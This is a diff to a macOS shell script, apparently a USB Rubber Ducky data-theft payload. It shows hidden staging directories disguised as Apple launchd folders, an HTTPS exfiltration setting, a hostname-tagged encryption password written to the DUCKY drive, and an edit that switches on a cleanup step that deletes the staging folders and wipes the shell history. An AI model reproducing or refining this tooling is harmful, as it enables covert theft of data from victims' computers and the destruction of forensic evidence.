@@ -2,12 +2,14 @@
 
 exfil_method="https"
 
-random_extension=$(LC_ALL=C tr -dc 'A-Za-z0-9!@#$%^&()_-+' < /dev/urandom | head -c 8)
-encryption_password=$(LC_ALL=C tr -dc 'A-Za-z0-9!@#$%^&()_-+' < /dev/urandom | head -c 32)
+random_extension=$(LC_ALL=C tr -dc 'A-Za-z0-9' < /dev/urandom | head -c 8)
+encryption_password=$(LC_ALL=C tr -dc 'A-Za-z0-9!@#$%^&()_-+' < /dev/urandom | head -c 128)
 hidden_dir="/private/var/tmp/.com.apple.launchd.$random_extension"
 stor_dir="/private/var/tmp/.com.apple.launchd.$random_extension"
 hidden_file="$random_extension.l.oo.t.tgz"
 
+
+echo "$encryption_password.$(hostname)" | base64 > "/Volumes/DUCKY/.encpw.$(hostname)"
 
 # Remote HTTPS server configuration
 https_server="localhost"
@@ -39,7 +41,6 @@ if [ ! -d "$stor_dir" ] ; then
    mkdir -p "$stor_dir"
 fi
 
-echo $encryption_password | base64 > /Volumes/DUCKY/.encpw
 
 
 check_ssh_endpoint() {
@@ -227,8 +228,6 @@ exfiltrate() {
 }
 
 cleanup() {
-  # Overwrite files before deletion
-    rm -rf "/private/var/tmp/com.apple.launchd/com.apple.launchd/$0"
     rm -rf "$hidden_dir"
     rm -rf "$stor_dir"
     echo > ~/.zsh_history
@@ -252,8 +251,8 @@ exfil_compress &
 #wait $compress_pid
 # exfiltrate &
 
-#wait $compress_pid
+wait $compress_pid
 #wait $exfiltrate_pid
-#cleanup &
+cleanup &
 
 #killall Terminal
